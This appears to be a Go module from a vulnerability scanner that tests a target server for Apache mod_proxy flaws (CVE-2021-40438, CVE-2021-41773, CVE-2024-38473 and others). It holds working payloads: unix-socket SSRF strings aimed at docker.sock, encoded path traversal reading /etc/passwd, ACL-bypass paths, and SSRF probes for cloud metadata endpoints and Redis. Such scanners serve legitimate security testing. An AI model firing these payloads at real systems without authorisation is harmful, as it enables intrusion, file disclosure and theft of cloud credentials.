package proxy

import (
	"fmt"
	"io"
	"net/http"
	"strings"
)

// ApacheVulnResult contains results from Apache mod_proxy vulnerability checks
type ApacheVulnResult struct {
	CVE_2021_40438_SSRF       bool     `json:"cve_2021_40438_ssrf"` // mod_proxy SSRF via unix socket
	CVE_2020_11984_RCE        bool     `json:"cve_2020_11984_rce"`  // mod_proxy_uwsgi buffer overflow
	CVE_2021_41773_PathTraversal bool  `json:"cve_2021_41773_path_traversal"` // Path traversal and RCE
	CVE_2024_38473_ACLBypass  bool     `json:"cve_2024_38473_acl_bypass"` // Path normalization ACL bypass
	CVE_2019_10092_XSS        bool     `json:"cve_2019_10092_xss"` // mod_proxy error page XSS
	SSRFVulnerable            bool     `json:"ssrf_vulnerable"` // Generic SSRF misconfig
	SSRFEndpoints             []string `json:"ssrf_endpoints,omitempty"`
	PathTraversalVuln         bool     `json:"path_traversal_vulnerable"`
	PathTraversalPaths        []string `json:"path_traversal_paths,omitempty"`
}

// testApacheCVE_2021_40438 tests for CVE-2021-40438 mod_proxy SSRF with unix socket notation
func (c *Checker) testApacheCVE_2021_40438(client *http.Client, result *ProxyResult) bool {
	if c.debug {
		result.DebugInfo += "[CVE-2021-40438] Testing for Apache mod_proxy SSRF vulnerability\n"
	}

	// CVE-2021-40438: mod_proxy SSRF via unix socket notation
	// Payload: unix:/path/to/socket|http://internal/
	testPayloads := []string{
		"unix:/var/run/docker.sock|http://localhost/v1.40/containers/json",
		"unix:/run/snapd.socket|http://localhost/v2/snaps",
		"unix:/var/run/docker.sock|http://127.0.0.1/_ping",
	}

	for _, payload := range testPayloads {
		req, err := http.NewRequest("GET", c.config.ValidationURL+"?url="+payload, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", c.config.UserAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := strings.ToLower(string(body))

		// Check for indicators of successful SSRF
		if resp.StatusCode == 200 {
			// Docker socket access indicators
			if strings.Contains(bodyStr, "\"id\":") || strings.Contains(bodyStr, "\"containers\"") ||
				strings.Contains(bodyStr, "\"images\"") {
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [CRITICAL] CVE-2021-40438 SSRF detected with payload: %s\n", payload)
				}
				return true
			}

			// Snap socket access indicators
			if strings.Contains(bodyStr, "\"type\":\"sync\"") || strings.Contains(bodyStr, "\"snaps\"") {
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [CRITICAL] CVE-2021-40438 SSRF detected with payload: %s\n", payload)
				}
				return true
			}
		}
	}

	return false
}

// testApacheCVE_2020_11984 tests for CVE-2020-11984 mod_proxy_uwsgi buffer overflow
func (c *Checker) testApacheCVE_2020_11984(client *http.Client, result *ProxyResult) bool {
	if c.debug {
		result.DebugInfo += "[CVE-2020-11984] Testing for Apache mod_proxy_uwsgi RCE vulnerability\n"
	}

	// CVE-2020-11984: Buffer overflow in mod_proxy_uwsgi
	// Triggered by large UWSGI request
	testPath := "/uwsgi/" + strings.Repeat("A", 8192)

	req, err := http.NewRequest("GET", c.config.ValidationURL+testPath, nil)
	if err != nil {
		return false
	}

	req.Header.Set("User-Agent", c.config.UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		// Connection reset or error might indicate vulnerability
		if strings.Contains(err.Error(), "reset") || strings.Contains(err.Error(), "broken pipe") {
			if c.debug {
				result.DebugInfo += "  [CRITICAL] CVE-2020-11984 potential buffer overflow (connection reset)\n"
			}
			return true
		}
		return false
	}
	defer resp.Body.Close()

	// Check for error responses that might indicate the vulnerability
	if resp.StatusCode == 500 || resp.StatusCode == 502 || resp.StatusCode == 503 {
		body, _ := io.ReadAll(resp.Body)
		bodyStr := strings.ToLower(string(body))

		// Look for mod_proxy_uwsgi error indicators
		if strings.Contains(bodyStr, "uwsgi") || strings.Contains(bodyStr, "buffer") ||
			strings.Contains(bodyStr, "internal server error") {
			if c.debug {
				result.DebugInfo += "  [CRITICAL] CVE-2020-11984 potential buffer overflow detected\n"
			}
			return true
		}
	}

	return false
}

// testApacheCVE_2021_41773 tests for CVE-2021-41773 path traversal and RCE
func (c *Checker) testApacheCVE_2021_41773(client *http.Client, result *ProxyResult) bool {
	if c.debug {
		result.DebugInfo += "[CVE-2021-41773] Testing for Apache path traversal and RCE\n"
	}

	// CVE-2021-41773: Path traversal in Apache 2.4.49
	testPaths := []string{
		"/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
		"/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
		"/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd",
		"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
	}

	for _, path := range testPaths {
		req, err := http.NewRequest("GET", c.config.ValidationURL+path, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", c.config.UserAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := strings.ToLower(string(body))

		// Check for passwd file content
		if resp.StatusCode == 200 && (strings.Contains(bodyStr, "root:x:0:0") ||
			strings.Contains(bodyStr, "/bin/bash") || strings.Contains(bodyStr, "/sbin/nologin")) {
			if c.debug {
				result.DebugInfo += fmt.Sprintf("  [CRITICAL] CVE-2021-41773 path traversal detected: %s\n", path)
			}
			return true
		}
	}

	return false
}

// testApacheCVE_2024_38473 tests for CVE-2024-38473 ACL bypass via path normalization
func (c *Checker) testApacheCVE_2024_38473(client *http.Client, result *ProxyResult) bool {
	if c.debug {
		result.DebugInfo += "[CVE-2024-38473] Testing for Apache ACL bypass via path normalization\n"
	}

	// CVE-2024-38473: ACL bypass through path normalization
	// Test protected paths with encoding variations
	protectedPaths := []string{
		"/admin",
		"/private",
		"/api/admin",
		"/wp-admin",
	}

	bypassTechniques := []string{
		"/%2e/",      // Encoded dot
		"/./",        // Current directory
		"//",         // Double slash
		"/%2f",       // Encoded slash
		"/;/",        // Semicolon separator
		"/../admin/", // Parent directory
	}

	for _, basePath := range protectedPaths {
		for _, technique := range bypassTechniques {
			testPath := technique + strings.TrimPrefix(basePath, "/")

			req, err := http.NewRequest("GET", c.config.ValidationURL+testPath, nil)
			if err != nil {
				continue
			}

			req.Header.Set("User-Agent", c.config.UserAgent)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			// If we get 200 instead of 403/401, ACL was bypassed
			if resp.StatusCode == 200 {
				bodyStr := strings.ToLower(string(body))
				// Verify it's not just an error page
				if !strings.Contains(bodyStr, "not found") && !strings.Contains(bodyStr, "404") {
					if c.debug {
						result.DebugInfo += fmt.Sprintf("  [HIGH] CVE-2024-38473 ACL bypass detected: %s\n", testPath)
					}
					return true
				}
			}
		}
	}

	return false
}

// testApacheSSRF tests for generic Apache mod_proxy SSRF misconfigurations
func (c *Checker) testApacheSSRF(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[APACHE SSRF] Testing for mod_proxy SSRF misconfigurations\n"
	}

	vulnerableEndpoints := []string{}

	// Test SSRF via various URL parameters
	ssrfTests := []struct {
		param  string
		target string
		desc   string
	}{
		{"url", "http://169.254.169.254/latest/meta-data/", "AWS metadata"},
		{"proxy", "http://localhost:8080/admin", "localhost admin"},
		{"target", "http://127.0.0.1:6379/", "Redis"},
		{"redirect", "http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"},
		{"fetch", "http://[::1]:80/", "IPv6 localhost"},
	}

	for _, test := range ssrfTests {
		req, err := http.NewRequest("GET", fmt.Sprintf("%s?%s=%s", c.config.ValidationURL, test.param, test.target), nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", c.config.UserAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(body)

		// Check for successful SSRF indicators
		if resp.StatusCode == 200 {
			// AWS metadata indicators
			if strings.Contains(bodyStr, "ami-id") || strings.Contains(bodyStr, "instance-id") {
				vulnerableEndpoints = append(vulnerableEndpoints, fmt.Sprintf("%s=%s (%s)", test.param, test.target, test.desc))
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [CRITICAL] SSRF to %s\n", test.desc)
				}
			}

			// GCP metadata indicators
			if strings.Contains(bodyStr, "computeMetadata") || strings.Contains(bodyStr, "project-id") {
				vulnerableEndpoints = append(vulnerableEndpoints, fmt.Sprintf("%s=%s (%s)", test.param, test.target, test.desc))
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [CRITICAL] SSRF to %s\n", test.desc)
				}
			}

			// Redis indicators
			if strings.Contains(bodyStr, "REDIS") || strings.Contains(bodyStr, "-ERR") {
				vulnerableEndpoints = append(vulnerableEndpoints, fmt.Sprintf("%s=%s (%s)", test.param, test.target, test.desc))
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [CRITICAL] SSRF to %s\n", test.desc)
				}
			}
		}
	}

	return len(vulnerableEndpoints) > 0, vulnerableEndpoints
}

// testApachePathTraversal tests for Apache-specific path traversal patterns
func (c *Checker) testApachePathTraversal(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[APACHE PATH TRAVERSAL] Testing for path traversal vulnerabilities\n"
	}

	vulnerablePaths := []string{}

	// Apache-specific traversal patterns
	testPaths := []string{
		"/../../../etc/passwd",
		"/.%2e/.%2e/.%2e/etc/passwd",
		"/./././etc/passwd",
		"//etc/passwd",
		"/;/etc/passwd",
		"/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
		"/cgi-bin/../../../etc/passwd",
		"/icons/../../../etc/passwd",
	}

	for _, path := range testPaths {
		req, err := http.NewRequest("GET", c.config.ValidationURL+path, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", c.config.UserAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := strings.ToLower(string(body))

		// Check for passwd file indicators
		if resp.StatusCode == 200 && (strings.Contains(bodyStr, "root:x:0:0") ||
			strings.Contains(bodyStr, "/bin/bash")) {
			vulnerablePaths = append(vulnerablePaths, path)
			if c.debug {
				result.DebugInfo += fmt.Sprintf("  [CRITICAL] Path traversal successful: %s\n", path)
			}
		}
	}

	return len(vulnerablePaths) > 0, vulnerablePaths
}

// performApacheVulnerabilityChecks runs all Apache mod_proxy vulnerability checks
func (c *Checker) performApacheVulnerabilityChecks(client *http.Client, result *ProxyResult) *ApacheVulnResult {
	apacheResult := &ApacheVulnResult{}

	// Test CVE-2021-40438 (mod_proxy SSRF)
	apacheResult.CVE_2021_40438_SSRF = c.testApacheCVE_2021_40438(client, result)

	// Test CVE-2020-11984 (mod_proxy_uwsgi RCE)
	apacheResult.CVE_2020_11984_RCE = c.testApacheCVE_2020_11984(client, result)

	// Test CVE-2021-41773 (path traversal)
	apacheResult.CVE_2021_41773_PathTraversal = c.testApacheCVE_2021_41773(client, result)

	// Test CVE-2024-38473 (ACL bypass)
	apacheResult.CVE_2024_38473_ACLBypass = c.testApacheCVE_2024_38473(client, result)

	// Test generic SSRF
	apacheResult.SSRFVulnerable, apacheResult.SSRFEndpoints = c.testApacheSSRF(client, result)

	// Test path traversal
	apacheResult.PathTraversalVuln, apacheResult.PathTraversalPaths = c.testApachePathTraversal(client, result)

	return apacheResult
}
